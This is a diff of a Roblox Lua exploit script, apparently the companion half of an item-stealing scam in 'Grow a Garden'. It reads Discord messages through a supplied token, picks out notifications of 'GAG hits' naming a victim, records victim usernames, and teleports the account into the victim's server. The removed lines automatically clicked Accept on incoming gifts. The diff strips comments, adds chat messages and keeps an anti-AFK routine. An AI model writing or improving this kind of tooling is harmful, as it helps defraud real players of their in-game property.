@@ -1,12 +1,12 @@
 if not game:IsLoaded() then
-	game.Loaded:Wait() -- Wait for game to load
+	game.Loaded:Wait()
 end
 
 if token == "" or channelId == "" then
     game.Players.LocalPlayer:kick("Add your token or channelId to use")
 end
 
-local bb = game:GetService("VirtualUser") -- Anti AFK
+local bb = game:GetService("VirtualUser")
 game:service "Players".LocalPlayer.Idled:connect(function()
     bb:CaptureController()
     bb:ClickButton2(Vector2.new())
@@ -20,7 +20,7 @@ if not victimFile then
     writefile("user_gag.txt", "victim username")
 end
 if not joinedFile then
-    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
+    writefile("joined_ids.txt", "[]")
 end
 local victimUser = readfile("user_gag.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
@@ -28,8 +28,8 @@ local didVictimLeave = false
 local timer = 0
 
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId) -- Add the new ID
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
+    table.insert(joinedIds, messageId)
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
 local function waitForPlayerLeave()
@@ -44,12 +44,11 @@ local function waitForPlayerLeave()
     end)
 end
 
-waitForPlayerLeave() -- Start listening for the victim leaving
+waitForPlayerLeave()
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
--- Wait for game to fully load
 while plr:GetAttribute("DataFullyLoaded") ~= true do
     plr:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
 end
@@ -60,23 +59,11 @@ while plr:GetAttribute("Loading_Screen_Finished") ~= true do
     plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
 end
 
-wait(1)
-local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
-
-local function acceptGifts()
-    while task.wait(0.1) do
-        for _, v in pairs(giftNoti:GetChildren()) do
-            if v:IsA("ImageLabel") then
-                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
-                replicatesignal(acceptImageButton.MouseButton1Click)
-            end
-        end
-    end
-end
-
-task.spawn(acceptGifts) -- Start accepting gifts
-
+wait(0.5)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
+
+wait(5)
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('.')
 
 local function increaseTimer()
     while task.wait(1) do
@@ -106,15 +93,15 @@ local function autoJoin()
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                 if message.embeds[1].title:find("Join to get GAG hit") then
-                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
                         local victimUsername = message.embeds[1].fields[1].value
 
                         if didVictimLeave or timer > 10 then
                             if not table.find(joinedIds, tostring(message.id)) then
-                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                saveJoinedId(tostring(message.id))
                                 writefile("user_gag.txt", victimUsername)
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                 return
                             end
                         end
